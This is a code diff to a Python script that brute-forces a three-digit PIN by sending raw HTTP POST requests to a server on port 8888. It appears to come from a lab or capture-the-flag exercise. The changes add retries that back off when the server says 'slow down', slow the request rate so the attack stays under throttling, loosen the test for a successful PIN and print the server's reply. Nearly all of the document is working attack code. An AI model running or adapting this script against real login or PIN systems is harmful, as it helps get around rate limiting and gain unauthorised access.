@@ -1,5 +1,6 @@
 import socket
 import time
+import re
 
 def create_post_request(pin):
     data = f"magicNumber={pin}"
@@ -11,7 +12,7 @@ Connection: close
 
 {data}"""
 
-def try_pin(s, pin):
+def try_pin(s, pin, retry_count=0):
     formatted_pin = f"{pin:03d}"
     request = create_post_request(formatted_pin)
     
@@ -33,15 +34,21 @@ def try_pin(s, pin):
         response = b''.join(response_data).decode('utf-8', errors='ignore')
         
         if "slow down" in response.lower():
-            print(f"[-] Rate limited on PIN {formatted_pin}, waiting...")
-            time.sleep(1)  
-            return False
+            if retry_count < 3: 
+                print(f"[!] Rate limited. Waiting longer before retry...")
+                time.sleep(2)  
+                return try_pin(s, pin, retry_count + 1)
+            else:
+                print(f"[!] Too many retries for PIN {formatted_pin}")
+                return False
         
-        if "Access granted" in response or "Success" in response:
+        if "Access Denied" not in response and "ENTER PIN" not in response:
             print(f"\n[+] Success! The correct PIN is: {formatted_pin}")
+            print(f"[+] Server response:")
+            print(response.strip())
             return True
         
-        print(f"[-] Trying PIN {formatted_pin} - Incorrect")
+        print(f"[-] Trying PIN {formatted_pin} - Access Denied")
         return False
         
     except socket.error as e:
@@ -53,6 +60,7 @@ def main():
     port = 8888
     
     print("[*] Starting PIN brute force attack...")
+    print("[*] Note: Using 1 second delay between attempts to handle rate limiting")
     print(f"[*] Target: {host}:{port}")
     
     for pin in range(1000):
@@ -64,13 +72,11 @@ def main():
                 if try_pin(s, pin):
                     break
                 
-                
-                time.sleep(0.1)
+                time.sleep(1)
                 
         except ConnectionRefusedError:
             print("[!] Connection refused. Make sure the server is running.")
-            time.sleep(2)
-            continue
+            return
         except socket.error as e:
             print(f"[!] Error occurred: {e}")
             time.sleep(1)
